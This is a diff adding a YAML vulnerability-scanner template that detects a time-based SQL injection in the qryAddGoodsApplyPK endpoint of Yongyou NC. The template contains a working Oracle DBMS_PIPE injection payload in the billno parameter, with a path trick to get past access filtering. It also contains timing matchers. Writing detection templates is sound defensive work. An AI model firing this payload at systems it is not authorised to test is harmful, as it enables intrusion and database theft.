@@ -1,0 +1,47 @@
+id: poc-yaml-yongyou-nc-qryaddgoodsapplypk-sqli
+info:
+  name: Yongyou NC-qryAddGoodsApplyPK-SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in Yongyou NC's qryAddGoodsApplyPK endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<title>YONYOU NC</title>"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1%27+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),{{t1}})+AND+%27ldrk%27%3d%27ldrk HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
